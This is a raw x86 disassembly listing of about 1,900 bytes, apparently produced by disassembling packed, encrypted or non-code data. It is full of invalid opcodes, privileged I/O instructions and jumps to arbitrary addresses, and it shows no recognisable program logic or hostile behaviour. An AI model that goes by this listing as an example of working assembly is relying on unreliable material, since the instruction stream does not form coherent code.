  41c8f4:	push   esp
  41c8f5:	jecxz  0x41c881
  41c8f7:	jl     0x41c8af
  41c8f9:	jmp    0xa245:0xd21c6683
  41c900:	pop    ebp
  41c901:	add    ah,BYTE PTR [edx+0x3]
  41c904:	icebp  
  41c905:	ins    BYTE PTR es:[edi],dx
  41c906:	mov    esi,0x3dd04c23
  41c90b:	jp     0x41c8a6
  41c90d:	rcr    eax,1
  41c90f:	js     0x41c8ff
  41c911:	and    al,0x3e
  41c913:	aaa    
  41c914:	rcr    BYTE PTR [esi],1
  41c916:	sub    BYTE PTR [eax+esi*2],al
  41c919:	adc    cl,BYTE PTR [ebx]
  41c91b:	shr    BYTE PTR [esi],0x99
  41c91e:	das    
  41c91f:	adc    ebp,DWORD PTR [esp+edi*1-0x54]
  41c923:	jae    0x41c900
  41c925:	add    esp,DWORD PTR [edx+edx*4-0x5d]
  41c929:	arpl   WORD PTR [eax+0x56],dx
  41c92c:	cli    
  41c92d:	add    eax,0x15177fb2
  41c932:	or     DWORD PTR [ecx-0x63],esi
  41c935:	aaa    
  41c936:	mov    ch,0x60
  41c938:	add    eax,0x7ee2318d
  41c93d:	aad    0x88
  41c93f:	xor    BYTE PTR [eax-0x555a69a7],dh
  41c945:	out    dx,eax
  41c946:	xchg   ebp,eax
  41c947:	and    eax,ecx
  41c949:	jp     0x41c8e5
  41c94b:	push   eax
  41c94c:	or     eax,0x672eb75e
  41c951:	(bad)  [ecx+0x56]
  41c954:	and    eax,0xc77ef0fc
  41c959:	xchg   ebp,eax
  41c95a:	jle    0x41c9cb
  41c95c:	dec    eax
  41c95d:	xchg   edi,eax
  41c95e:	and    ebx,DWORD PTR [ecx-0x7a]
  41c961:	jnp    0x41c9d1
  41c963:	mov    DWORD PTR [edi],ecx
  41c965:	sbb    cl,bh
  41c967:	sbb    al,0x3f
  41c969:	mov    ebp,0x47baccd9
  41c96e:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c970:	mov    edx,0x1827bc4d
  41c975:	fidiv  DWORD PTR ds:0x778ad444
  41c97b:	sar    DWORD PTR [esi],0xc5
  41c97e:	std    
  41c97f:	es dec ebx
  41c981:	int3   
  41c982:	xchg   ah,al
  41c984:	hlt    
  41c985:	(bad)  ds:0x37940031
  41c98b:	pop    es
  41c98c:	adc    ebx,DWORD PTR [esi]
  41c98e:	cwde   
  41c98f:	stos   DWORD PTR es:[edi],eax
  41c990:	stos   DWORD PTR es:[edi],eax
  41c991:	mov    eax,0xd2b8827d
  41c996:	lds    esp,FWORD PTR [eax+0x59]
  41c999:	cld    
  41c99a:	pop    ecx
  41c99c:	cmp    eax,0xdbe46f30
  41c9a1:	mov    ds:0x48cc8c5e,al
  41c9a6:	sbb    eax,0x73729cb5
  41c9ab:	and    ebx,edx
  41c9ad:	mov    ds:0xf834a60d,al
  41c9b2:	mov    bh,0x21
  41c9b4:	in     al,0x18
  41c9b6:	cli    
  41c9b7:	aaa    
  41c9b8:	jb     0x41c951
  41c9ba:	inc    ebx
  41c9bb:	inc    ecx
  41c9bc:	std    
  41c9bd:	sbb    ch,dl
  41c9bf:	push   ebp
  41c9c0:	mov    cl,BYTE PTR [esi-0x19206822]
  41c9c6:	popf   
  41c9c7:	jmp    0x41c959
  41c9c9:	inc    ecx
  41c9ca:	pop    eax
  41c9cb:	ret    0x661a
  41c9ce:	xchg   BYTE PTR [ecx-0x3a287789],dh
  41c9d4:	xchg   esp,eax
  41c9d5:	sar    DWORD PTR [edx-0x7bba54f4],1
  41c9db:	daa    
  41c9dc:	retf   0x50f6
  41c9df:	add    DWORD PTR [edx-0x46ea6740],ecx
  41c9e5:	sbb    al,0xd2
  41c9e7:	push   0xa185b621
  41c9ec:	push   edx
  41c9ed:	push   ecx
  41c9ee:	or     eax,0x32d2ba1a
  41c9f3:	cmc    
  41c9f4:	mov    ch,0x9a
  41c9f6:	xor    al,0x3b
  41c9f8:	in     eax,0xa
  41c9fa:	xlat   BYTE PTR ds:[ebx]
  41c9fb:	cwde   
  41c9fc:	pop    ss
  41c9fd:	xchg   edi,eax
  41c9fe:	(bad)  
  41c9ff:	push   eax
  41ca00:	pop    ss
  41ca01:	sbb    BYTE PTR [ecx],al
  41ca03:	sahf   
  41ca04:	sub    eax,0x842f646a
  41ca09:	jb     0x41ca06
  41ca0b:	sub    eax,0xa9f29591
  41ca10:	sub    edi,DWORD PTR [ebx-0x77a79a4d]
  41ca16:	push   esi
  41ca17:	xor    esp,ebx
  41ca19:	sub    esp,ecx
  41ca1b:	mov    ebp,0xe3473e23
  41ca20:	mov    WORD PTR [edi+0x10],fs
  41ca23:	mov    esp,0xc3d57947
  41ca28:	sub    eax,0x3ccf941c
  41ca2d:	fcom   QWORD PTR [esi-0x8b5cedb]
  41ca33:	sub    eax,0x979d6665
  41ca38:	fldcw  WORD PTR [ebx+0x1a]
  41ca3b:	jp     0x41c9f5
  41ca3d:	mov    al,0xd8
  41ca3f:	dec    ebp
  41ca40:	push   0xfffffff1
  41ca42:	loopne 0x41c9e5
  41ca44:	mov    eax,ds:0x6cacc140
  41ca49:	adc    BYTE PTR [ebx-0x73],ah
  41ca4c:	push   es
  41ca4d:	xor    al,0xd
  41ca4f:	and    BYTE PTR [eax-0x161a0076],al
  41ca55:	xchg   esp,eax
  41ca56:	jne    0x41ca12
  41ca58:	cmp    eax,DWORD PTR [esi-0x7022f19c]
  41ca5e:	jo     0x41cab3
  41ca60:	xchg   esi,ecx
  41ca62:	pop    ebp
  41ca63:	stos   DWORD PTR es:[edi],eax
  41ca64:	cmp    dh,al
  41ca66:	int    0xa1
  41ca68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca69:	scas   al,BYTE PTR es:[edi]
  41ca6a:	sbb    BYTE PTR [edi],ch
  41ca6c:	stc    
  41ca6d:	push   edx
  41ca6e:	jge    0x41ca5d
  41ca70:	leave  
  41ca71:	repz or BYTE PTR [ebx],ch
  41ca74:	pop    edx
  41ca76:	jns    0x41ca88
  41ca78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca79:	ins    BYTE PTR es:[edi],dx
  41ca7a:	add    eax,0x1c2fe99c
  41ca7f:	pop    ss
  41ca80:	and    al,BYTE PTR [esp+esi*4-0x24]
  41ca84:	repnz retf 0xd9df
  41ca88:	sub    eax,0x8e529853
  41ca8d:	xchg   DWORD PTR [ecx+0x12029883],ebx
  41ca93:	es inc ebp
  41ca95:	and    eax,0x3b8c633a
  41ca9a:	and    ebp,DWORD PTR [eax+0x51]
  41ca9d:	jp     0x41ca62
  41ca9f:	xchg   esp,eax
  41caa0:	in     eax,0x92
  41caa2:	daa    
  41caa3:	adc    eax,0xabd7b670
  41caa8:	rcr    ecx,1
  41caaa:	stos   DWORD PTR es:[edi],eax
  41caab:	sub    al,0xdb
  41caad:	mov    ebx,0x13cf8602
  41cab2:	int3   
  41cab3:	aaa    
  41cab4:	sub    al,BYTE PTR [ecx-0x44]
  41cab7:	aam    0x9c
  41cab9:	adc    al,0x5b
  41cabb:	jmp    0xc62e:0x58d0ab34
  41cac2:	sahf   
  41cac3:	sbb    al,0xb5
  41cac5:	pop    ecx
  41cac6:	mov    dl,0xa9
  41cac8:	cmc    
  41cac9:	push   ebp
  41caca:	or     DWORD PTR [edx-0x1d],edi
  41cacd:	nop
  41cace:	aas    
  41cacf:	fsub   DWORD PTR [edx+0x202ff29d]
  41cad5:	xlat   BYTE PTR ds:[ebx]
  41cad6:	lods   eax,DWORD PTR ds:[esi]
  41cad7:	out    dx,al
  41cad8:	(bad)  
  41cad9:	cli    
  41cada:	jl     0x41caa5
  41cadc:	and    ebp,ebp
  41cade:	mov    eax,ds:0xdcb91998
  41cae3:	test   ebx,ebp
  41cae5:	in     eax,dx
  41cae6:	popa   
  41cae7:	pop    es
  41cae8:	mov    DWORD PTR [ebx-0x52],eax
  41caeb:	inc    ebp
  41caec:	pop    ss
  41caed:	aad    0x55
  41caef:	enter  0x57a2,0x4d
  41caf3:	ins    BYTE PTR es:[edi],dx
  41caf4:	mov    BYTE PTR [ebp-0x67f08c88],ch
  41cafa:	test   BYTE PTR [ebp-0xc],al
  41cafd:	mov    BYTE PTR [ecx+edx*8-0x4f6bf206],ah
  41cb04:	(bad)  
  41cb05:	std    
  41cb06:	adc    dh,BYTE PTR [ebp+ebp*4+0x22]
  41cb0a:	cwde   
  41cb0b:	sbb    BYTE PTR [eax-0x2fcbc71f],al
  41cb11:	stos   DWORD PTR es:[edi],eax
  41cb12:	xchg   edi,eax
  41cb13:	and    ch,ch
  41cb15:	mov    bh,0x3a
  41cb17:	push   es
  41cb18:	fsub   QWORD PTR [ebp+eiz*2+0x3]
  41cb1c:	iret   
  41cb1d:	repz loope 0x41cb1d
  41cb20:	nop    esp
  41cb23:	pop    edi
  41cb24:	call   0x6947:0xc2b8b6b5
  41cb2b:	jmp    0x41cadf
  41cb2d:	xchg   esp,eax
  41cb2e:	sahf   
  41cb2f:	mov    DWORD PTR [edx-0x5000a6e6],eax
  41cb35:	add    DWORD PTR [ecx-0x28ecfd88],ecx
  41cb3b:	mov    ch,0x87
  41cb3d:	pop    cx
  41cb3f:	or     ebx,DWORD PTR [esi+0x22fb24a9]
  41cb45:	lock (bad) 
  41cb47:	mov    edx,0x97182b1a
  41cb4c:	lds    ebx,FWORD PTR [ebx-0x1f]
  41cb4f:	dec    edx
  41cb50:	(bad)  
  41cb51:	cdq    
  41cb52:	adc    BYTE PTR [ecx-0x3718f8fb],bh
  41cb58:	fs push cs
  41cb5a:	xchg   ecx,eax
  41cb5b:	ins    BYTE PTR es:[edi],dx
  41cb5c:	sbb    bl,BYTE PTR [eax-0x77ecc10]
  41cb62:	xchg   ebx,eax
  41cb63:	shr    BYTE PTR [edi+esi*4],cl
  41cb66:	cmp    al,0xbf
  41cb68:	rcr    DWORD PTR [edi-0x3],1
  41cb6b:	xor    BYTE PTR [esi],dl
  41cb6d:	in     eax,dx
  41cb6e:	jmp    0xa6f2317c
  41cb73:	adc    al,0x0
  41cb75:	jb     0x41cbca
  41cb77:	or     eax,0x982fccdf
  41cb7c:	fucomip st,st(0)
  41cb7e:	push   ebp
  41cb7f:	in     al,0x95
  41cb81:	clc    
  41cb82:	inc    eax
  41cb83:	hlt    
  41cb84:	ds jmp 0x26a6:0x4ede19fc
  41cb8c:	sbb    eax,0x4392ae6d
  41cb91:	mov    dl,0xc5
  41cb93:	mov    dl,0x32
  41cb95:	rcl    BYTE PTR [ecx-0x54],0xad
  41cb99:	fxch   st(5)
  41cb9b:	cmp    DWORD PTR [edi+0x4c],ebp
  41cb9e:	dec    edi
  41cb9f:	cdq    
  41cba0:	loop   0x41cb73
  41cba2:	push   ebx
  41cba3:	cmp    al,0x1d
  41cba5:	inc    edi
  41cba6:	cmc    
  41cba7:	rol    dh,1
  41cba9:	jl     0x41cb9e
  41cbab:	(bad)  
  41cbac:	jns    0x41cb60
  41cbae:	mov    ebx,0xdf295ddf
  41cbb3:	fadd   QWORD PTR [ebp+0x432b2933]
  41cbb9:	or     BYTE PTR [ecx],bh
  41cbbb:	push   ds
  41cbbc:	cli    
  41cbbd:	sahf   
  41cbbe:	inc    edi
  41cbbf:	mov    bh,0x11
  41cbc1:	cmp    bh,BYTE PTR [edx]
  41cbc3:	(bad)  
  41cbc4:	pop    esi
  41cbc5:	inc    eax
  41cbc6:	sub    esp,DWORD PTR [esi+0x4043bcc7]
  41cbcc:	mov    cl,0x9e
  41cbce:	jbe    0x41cb64
  41cbd0:	sar    dl,0xa4
  41cbd3:	add    eax,DWORD PTR [esi+0xe]
  41cbd6:	xor    esi,esp
  41cbd8:	sti    
  41cbd9:	mov    ecx,0xf4ec8dd5
  41cbde:	iret   
  41cbdf:	out    0x45,al
  41cbe1:	ds pop edi
  41cbe3:	mov    esi,0x489fe435
  41cbe8:	sbb    bh,cl
  41cbea:	cmp    bh,BYTE PTR ds:0x7fb79ebc
  41cbf0:	pcmpgtd mm7,mm5
  41cbf3:	iret   
  41cbf4:	mov    ebx,0xbcbd6826
  41cbf9:	jg     0x41cb95
  41cbfb:	add    DWORD PTR [ebp+0x744c58be],eax
  41cc01:	dec    ecx
  41cc02:	ret    
  41cc03:	fmul   QWORD PTR [ebx]
  41cc05:	push   0x3c
  41cc07:	lea    ebp,[eax+0x20]
  41cc0a:	fisttp QWORD PTR ds:0x45a408f3
  41cc10:	clc    
  41cc11:	mov    al,ds:0xc19f4734
  41cc16:	xor    eax,DWORD PTR [ebx-0x5]
  41cc19:	jle    0x41cc06
  41cc1b:	imul   eax,DWORD PTR [esp+esi*2],0xffffffa1
  41cc1f:	jmp    0x41cbd7
  41cc21:	jo     0x41cba5
  41cc23:	lahf   
  41cc24:	cwde   
  41cc25:	mov    al,0x92
  41cc27:	xchg   BYTE PTR [ebx+0x5d],dl
  41cc2a:	lods   eax,DWORD PTR ds:[esi]
  41cc2b:	das    
  41cc2c:	sub    eax,0x3d807fa7
  41cc31:	repnz push ecx
  41cc33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc34:	cmp    eax,DWORD PTR [ecx-0x4b]
  41cc37:	in     eax,dx
  41cc38:	or     bh,BYTE PTR [ebx+0x34]
  41cc3b:	(bad)  
  41cc3c:	outs   dx,BYTE PTR ds:[esi]
  41cc3d:	or     ecx,DWORD PTR [ebx]
  41cc3f:	sbb    DWORD PTR ds:0xb2ee4e14,edx
  41cc45:	cli    
  41cc46:	jmp    0x84a20556
  41cc4b:	stc    
  41cc4c:	sub    DWORD PTR [esi],ebp
  41cc4e:	daa    
  41cc4f:	sub    DWORD PTR [ebx],ecx
  41cc51:	aam    0x75
  41cc53:	jmp    0x88227f4c
  41cc58:	idiv   ch
  41cc5a:	sbb    bl,ch
  41cc5c:	jmp    0x41ccb4
  41cc5e:	call   0x5bc1cbf3
  41cc63:	ffreep st(6)
  41cc65:	mov    al,0x68
  41cc67:	(bad)  
  41cc69:	dec    ebx
  41cc6a:	dec    ecx
  41cc6b:	push   0x3f
  41cc6d:	pop    ebp
  41cc6e:	mov    WORD PTR [ecx+eiz*4],?
  41cc71:	mov    cl,0x28
  41cc73:	pop    esi
  41cc74:	adc    esi,DWORD PTR [ebp+0x13429a8b]
  41cc7a:	add    bh,ch
  41cc7c:	xor    eax,0x1a2c7f7d
  41cc81:	sub    eax,0xbbbc2667
  41cc86:	mov    ds:0xa7381d48,al
  41cc8b:	push   0x61cc56ce
  41cc90:	(bad)  
  41cc91:	dec    eax
  41cc92:	pop    ebp
  41cc93:	push   ebx
  41cc94:	scas   al,BYTE PTR es:[edi]
  41cc95:	xor    DWORD PTR [edx-0x2a],eax
  41cc98:	sub    cl,BYTE PTR fs:[ebp+0x20]
  41cc9c:	lock xor ecx,edi
  41cc9f:	push   ebp
  41cca0:	and    al,dh
  41cca2:	or     BYTE PTR [ecx],ah
  41cca4:	stc    
  41cca5:	sti    
  41cca6:	ror    BYTE PTR [edi],1
  41cca8:	lock jmp DWORD PTR [ecx]
  41ccab:	mov    edx,0x33bc337a
  41ccb0:	jl     0x41cca2
  41ccb2:	mov    ch,0x2
  41ccb4:	push   edi
  41ccb5:	test   eax,0x92cf2be9
  41ccba:	stos   DWORD PTR es:[edi],eax
  41ccbb:	sub    DWORD PTR [edx+0x21bf94e6],edi
  41ccc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccc2:	fdiv   QWORD PTR [ebp-0x23]
  41ccc5:	(bad)  
  41ccc6:	xor    eax,0x405a9865
  41cccb:	fs xchg edi,eax
  41cccd:	mov    esp,DWORD PTR [eax-0x6fa0e0a6]
  41ccd3:	les    edi,FWORD PTR [ecx+0x2cd1e04e]
  41ccd9:	enter  0x910f,0x2f
  41ccdd:	loope  0x41cce2
  41ccdf:	scas   al,BYTE PTR es:[edi]
  41cce0:	inc    ebx
  41cce1:	xor    al,0x79
  41cce3:	xor    DWORD PTR [edx+esi*2+0x38],ebp
  41cce7:	pop    esp
  41cce8:	xchg   esi,eax
  41cce9:	lahf   
  41ccea:	push   ebx
  41cceb:	(bad)  
  41ccec:	stos   DWORD PTR es:[edi],eax
  41cced:	call   0x753d:0xb5cd22ba
  41ccf4:	add    BYTE PTR [ecx],al
  41ccf6:	repz je 0x41ccdb
  41ccf9:	add    ebp,DWORD PTR [ecx-0xa]
  41ccfc:	(bad)  
  41ccfd:	(bad)  [edx]
  41ccff:	mov    cl,0x71
  41cd01:	ds aaa 
  41cd03:	stc    
  41cd04:	mov    ah,0x4
  41cd06:	jbe    0x41ccfc
  41cd08:	test   al,0x40
  41cd0a:	out    0x32,eax
  41cd0c:	aaa    
  41cd0d:	imul   edi
  41cd0f:	fwait
  41cd10:	repz shr BYTE PTR [ebx-0x3abe2d53],1
  41cd17:	xlat   BYTE PTR ds:[ebx]
  41cd18:	xchg   esp,eax
  41cd19:	push   ecx
  41cd1a:	sar    DWORD PTR [esi-0x22404268],cl
  41cd20:	mov    bh,0x81
  41cd22:	sbb    cl,cl
  41cd24:	jle    0x41cd78
  41cd26:	mov    ebx,0xca7a988b
  41cd2b:	(bad)  
  41cd2c:	pop    esi
  41cd2d:	push   ebp
  41cd2e:	cwde   
  41cd2f:	loop   0x41ccbc
  41cd31:	scas   al,BYTE PTR es:[edi]
  41cd32:	mov    al,0x33
  41cd34:	dec    ebp
  41cd35:	cmp    al,0x4b
  41cd37:	push   ecx
  41cd38:	cmp    edx,DWORD PTR [edi-0x2b80ee26]
  41cd3e:	or     DWORD PTR [ebx+0x4f4c6f7f],edi
  41cd44:	xor    al,0xc3
  41cd46:	xor    edx,ebx
  41cd48:	inc    ecx
  41cd49:	cs sti 
  41cd4b:	sbb    eax,0xe5919b52
  41cd50:	sar    DWORD PTR ds:0xa8c660ec,1
  41cd56:	scas   al,BYTE PTR es:[edi]
  41cd57:	mov    edi,0x91addeaa
  41cd5c:	mov    ecx,0xb41900eb
  41cd61:	stos   DWORD PTR es:[edi],eax
  41cd62:	mov    ss,WORD PTR [ecx-0x3f]
  41cd65:	stc    
  41cd66:	pop    edi
  41cd67:	xor    eax,0xc8a6cd2a
  41cd6c:	hlt    
  41cd6d:	dec    esp
  41cd6e:	sub    al,0x22
  41cd70:	xor    eax,0x2ad5a748
  41cd75:	fnstsw WORD PTR [ebx]
  41cd77:	mov    eax,ds:0x198f7f72
  41cd7c:	add    ecx,DWORD PTR [edi]
  41cd7e:	test   BYTE PTR [esi-0x3d653f1b],dl
  41cd84:	call   0x8c6fdfb2
  41cd89:	jl     0x41cd3e
  41cd8b:	cdq    
  41cd8c:	pop    eax
  41cd8d:	dec    edx
  41cd8e:	or     eax,ecx
  41cd90:	push   esp
  41cd91:	mov    al,0x93
  41cd93:	xlat   BYTE PTR ds:[ebx]
  41cd94:	in     al,dx
  41cd95:	push   ebp
  41cd96:	in     al,dx
  41cd97:	push   ebp
  41cd98:	mov    ds:0xe1eda971,eax
  41cd9d:	and    al,0x33
  41cd9f:	cmp    al,0xdf
  41cda1:	scas   eax,DWORD PTR es:[edi]
  41cda2:	loope  0x41cd4a
  41cda4:	or     cl,ah
  41cda6:	fistp  QWORD PTR [eax-0x1e]
  41cda9:	pushf  
  41cdaa:	ror    DWORD PTR ds:0x899c0eff,1
  41cdb0:	mov    ah,0xf6
  41cdb2:	inc    ebp
  41cdb3:	xchg   ecx,eax
  41cdb4:	and    DWORD PTR [ebx-0xc],ebp
  41cdb7:	call   0x9ecf:0x3c658530
  41cdbe:	jl     0x41cde0
  41cdc0:	jp     0x41cdb9
  41cdc2:	add    bl,bl
  41cdc4:	(bad)  
  41cdc5:	mov    eax,ds:0xeaca6441
  41cdca:	and    DWORD PTR [esi+esi*8+0x7e],0x51
  41cdcf:	ret    
  41cdd0:	es (bad) 
  41cdd2:	aaa    
  41cdd3:	pop    eax
  41cdd4:	hlt    
  41cdd5:	cwde   
  41cdd6:	out    dx,al
  41cdd7:	fidivr WORD PTR [ecx+0x585f04e8]
  41cddd:	push   edx
  41cdde:	mov    edi,0xc108c2ca
  41cde3:	fdivr  DWORD PTR [eax+ebx*1+0x3d]
  41cde7:	iret   
  41cde8:	xchg   ebx,eax
  41cde9:	std    
  41cdea:	aaa    
  41cdeb:	pop    esp
  41cdec:	sub    edx,0xffffff98
  41cdef:	mov    edi,0x9475f2f2
  41cdf4:	out    0xa0,al
  41cdf6:	sub    BYTE PTR [edi+0x7756ddcc],bh
  41cdfc:	sub    eax,DWORD PTR [edi+ebp*2+0x1a]
  41ce00:	xchg   edx,eax
  41ce01:	dec    ecx
  41ce02:	push   es
  41ce03:	jge    0x41ce38
  41ce05:	add    eax,0xd8459e9f
  41ce0a:	dec    edi
  41ce0b:	scas   al,BYTE PTR es:[edi]
  41ce0c:	xor    esp,edi
  41ce0e:	xchg   edi,eax
  41ce0f:	sub    BYTE PTR [edx+ebx*2-0xd],bl
  41ce13:	sbb    BYTE PTR [esi],0x55
  41ce16:	dec    ebp
  41ce17:	sbb    al,0xe7
  41ce19:	(bad)  
  41ce1a:	shl    ecx,cl
  41ce1c:	popf   
  41ce1d:	shl    eax,cl
  41ce1f:	xor    ch,BYTE PTR [ecx+0x7e159797]
  41ce25:	push   es
  41ce26:	enter  0xba01,0x25
  41ce2a:	mov    cl,0x19
  41ce2c:	mov    dl,0xe2
  41ce2e:	sub    al,BYTE PTR [esp+ebp*2+0x4d]
  41ce32:	adc    DWORD PTR [edi+0x60],ebx
  41ce35:	pop    ebx
  41ce36:	or     DWORD PTR [eax],ecx
  41ce38:	mov    dl,0xd6
  41ce3a:	xor    eax,0xb6246a08
  41ce3f:	aas    
  41ce40:	mov    dl,0x1
  41ce42:	dec    eax
  41ce43:	daa    
  41ce44:	inc    esp
  41ce45:	call   0x2478:0xa577680a
  41ce4c:	sbb    BYTE PTR [edx-0x16],ch
  41ce4f:	xchg   edi,eax
  41ce50:	aaa    
  41ce51:	arpl   WORD PTR [ebp+0x23],cx
  41ce54:	mov    ebx,0x9f4dde50
  41ce59:	or     eax,0xca1dedb7
  41ce5e:	mov    edx,0xe662b276
  41ce63:	push   ss
  41ce64:	and    bl,bl
  41ce66:	idiv   edi
  41ce68:	mov    ch,BYTE PTR [ebp+0x5a]
  41ce6b:	pushf  
  41ce6c:	sbb    eax,0x9c3e5ede
  41ce71:	gs inc edi
  41ce73:	fiadd  WORD PTR [esi-0x68956ed5]
  41ce79:	pusha  
  41ce7a:	jecxz  0x41ce02
  41ce7c:	daa    
  41ce7d:	or     DWORD PTR [ecx-0xa],esi
  41ce80:	lods   eax,DWORD PTR ds:[esi]
  41ce81:	mov    edx,0x7747e268
  41ce86:	jbe    0x41ceec
  41ce88:	leave  
  41ce89:	out    0x9f,al
  41ce8b:	nop
  41ce8c:	sub    edx,0xffffff91
  41ce8f:	hlt    
  41ce90:	aam    0xe8
  41ce92:	xchg   esi,eax
  41ce93:	jae    0x41cf07
  41ce95:	dec    ebp
  41ce96:	pop    esi
  41ce97:	call   0xb5779541
  41ce9c:	sbb    BYTE PTR [edi+0x7c1eb565],bh
  41cea2:	inc    edi
  41cea3:	out    dx,al
  41cea4:	xor    ah,dl
  41cea6:	xor    BYTE PTR [esp+ebp*8-0x79],cl
  41ceaa:	cmp    eax,DWORD PTR [eax-0x3bd95626]
  41ceb0:	test   al,0x45
  41ceb2:	and    ebp,DWORD PTR [eax]
  41ceb4:	mov    fs,ebp
  41ceb6:	jecxz  0x41ce77
  41ceb8:	(bad)  
  41ceb9:	(bad)  [esi+0x1d]
  41cebc:	outs   dx,BYTE PTR ds:[esi]
  41cebd:	test   DWORD PTR [edi+0x5],ebx
  41cec0:	imul   edi,eax,0x6a
  41cec3:	pusha  
  41cec4:	and    dh,BYTE PTR [ecx+0x6331054d]
  41ceca:	fwait
  41cecb:	in     eax,0x71
  41cecd:	popf   
  41cece:	stc    
  41cecf:	cmp    dl,ch
  41ced1:	in     eax,0xde
  41ced3:	fs mov eax,0xc2a3edbd
  41ced9:	sub    DWORD PTR [ebx-0x26],0x71ed3894
  41cee0:	fs adc al,0x37
  41cee3:	fmul   st(2),st
  41cee5:	test   al,0x41
  41cee7:	test   eax,0xb3c7868
  41ceec:	xchg   edi,eax
  41ceed:	inc    edi
  41ceee:	ror    BYTE PTR [edi+0x9021eb9],cl
  41cef4:	mov    edi,0x5ab7b36
  41cef9:	lods   al,BYTE PTR ds:[esi]
  41cefa:	jne    0x41cefe
  41cefc:	mul    BYTE PTR [edi+0x78]
  41ceff:	das    
  41cf00:	and    edx,DWORD PTR [ecx-0x20565fc8]
  41cf06:	aaa    
  41cf07:	xor    ebp,esi
  41cf09:	push   es
  41cf0a:	cli    
  41cf0b:	jbe    0x41cf4f
  41cf0d:	jno    0x41cf3b
  41cf0f:	arpl   sp,ax
  41cf11:	xor    dl,BYTE PTR [eax]
  41cf13:	setb   ah
  41cf16:	fistp  WORD PTR [edi+0x39086891]
  41cf1c:	sbb    edx,ecx
  41cf1e:	dec    esp
  41cf1f:	adc    BYTE PTR ds:0x59cd5318,al
  41cf25:	push   esp
  41cf26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf27:	sub    DWORD PTR [edi+edx*4+0x79743761],ecx
  41cf2e:	(bad)  
  41cf2f:	js     0x41cf07
  41cf31:	cmp    dl,BYTE PTR [edx-0x2f]
  41cf34:	ja     0x41cf51
  41cf36:	ss int3 
  41cf38:	adc    BYTE PTR [ebx],ah
  41cf3a:	mov    ecx,0xfe16639d
  41cf3f:	push   cs
  41cf40:	adc    al,0xcf
  41cf42:	dec    ebx
  41cf43:	dec    eax
  41cf44:	hlt    
  41cf45:	push   ds
  41cf46:	cmp    eax,0xe7be9f12
  41cf4b:	dec    eax
  41cf4c:	lods   al,BYTE PTR ds:[esi]
  41cf4d:	mov    esi,DWORD PTR [ecx+0x3c]
  41cf50:	mov    cs,WORD PTR [edi-0x7c]
  41cf53:	sbb    edx,DWORD PTR [edi-0x3b]
  41cf56:	fidivr WORD PTR [ebx+eiz*1-0x50f2d357]
  41cf5d:	test   eax,0x4e8f98db
  41cf62:	out    dx,al
  41cf63:	dec    edi
  41cf64:	inc    edi
  41cf65:	retf   0x377
  41cf68:	push   0xb
  41cf6a:	ja     0x41cfae
  41cf6c:	pop    edx
  41cf6d:	popa   
  41cf6e:	push   0x57
  41cf70:	jne    0x41cefc
  41cf72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf74:	push   es
  41cf75:	xchg   esp,eax
  41cf76:	add    al,0x48
  41cf78:	(bad)  
  41cf7a:	push   ebp
  41cf7b:	mov    bl,0x2a
  41cf7d:	fs loope 0x41cf7e
  41cf80:	imul   edx,DWORD PTR [ebx+0x4f2bbede],0xcb4fa418
  41cf8a:	pop    ss
  41cf8b:	movlps xmm7,QWORD PTR [edx-0xc09e4d7]
  41cf92:	mov    WORD PTR [eax+0x3b],?
  41cf95:	push   edx
  41cf96:	xrelease xchg BYTE PTR [eax+0x4e],al
  41cf9a:	push   es
  41cf9b:	add    ebx,DWORD PTR [edi]
  41cf9d:	mov    cl,0x1e
  41cf9f:	jecxz  0x41cfcd
  41cfa1:	adc    esi,DWORD PTR [ebx+ebp*2-0x61]
  41cfa5:	mov    edx,0x7756eba1
  41cfaa:	mov    ecx,0x60b2912d
  41cfaf:	and    eax,0x119e09c1
  41cfb4:	dec    eax
  41cfb5:	outs   dx,BYTE PTR ds:[esi]
  41cfb6:	mov    bh,BYTE PTR [ecx]
  41cfb8:	xchg   edx,eax
  41cfb9:	add    bl,dl
  41cfbb:	add    esi,edx
  41cfbd:	ror    esp,cl
  41cfbf:	push   eax
  41cfc0:	or     eax,0x671b1ef1
  41cfc5:	mov    al,ds:0x19b150ab
  41cfca:	sbb    BYTE PTR [ebx+0x6d39ed16],bh
  41cfd0:	adc    al,0x6e
  41cfd2:	js     0x41d045
  41cfd4:	dec    ebx
  41cfd5:	push   0xffffffd6
  41cfd7:	xchg   edi,eax
  41cfd8:	and    BYTE PTR [esi],ch
  41cfda:	or     al,BYTE PTR [ebp-0x2b]
  41cfdd:	or     al,0xce
  41cfe0:	jo     0x41cffe
  41cfe2:	mov    eax,ds:0x8fc6f1a8
  41cfe7:	inc    ebp
  41cfe8:	paddw  mm2,QWORD PTR [eax-0x69]
  41cfec:	fnsave [ebx]
  41cfee:	lods   eax,DWORD PTR ds:[esi]
  41cfef:	in     eax,0xe5
  41cff1:	push   edx
  41cff2:	jp     0x41cff4
  41cff4:	iret   
  41cff5:	iret   
  41cff6:	sbb    BYTE PTR [edi+0x46],bh
  41cff9:	imul   edi,esi,0xa729ce3f
  41cfff:	popf   
  41d000:	repnz arpl WORD PTR [eax],ax
  41d003:	mov    eax,ds:0xb5eebd0f
  41d008:	or     BYTE PTR ds:0x5c37a295,bl
  41d00e:	pop    ebx
  41d00f:	jne    0x41d002
  41d011:	cmc    
  41d012:	icebp  
  41d013:	out    0xa4,al
  41d015:	repnz cwde 
  41d017:	fwait
  41d018:	mov    ah,0xfe
  41d01a:	call   0x2765af6d
  41d01f:	in     al,0xf1
  41d021:	pop    ecx
  41d022:	sbb    DWORD PTR [edi+ebp*8+0xb],esp
  41d026:	jnp    0x41d078
  41d028:	cmc    
  41d029:	cs push cs
  41d02b:	dec    esp
  41d02c:	mov    eax,ds:0xdbf62750
  41d031:	inc    esi
  41d032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d033:	pop    eax
  41d034:	ins    DWORD PTR es:[edi],dx
  41d035:	ja     0x41d01f
  41d037:	adc    eax,0x858ae9cf
  41d03c:	stos   DWORD PTR es:[edi],eax
  41d03d:	or     DWORD PTR [edi+0x61727e84],edi
  41d043:	jle    0x41d05a
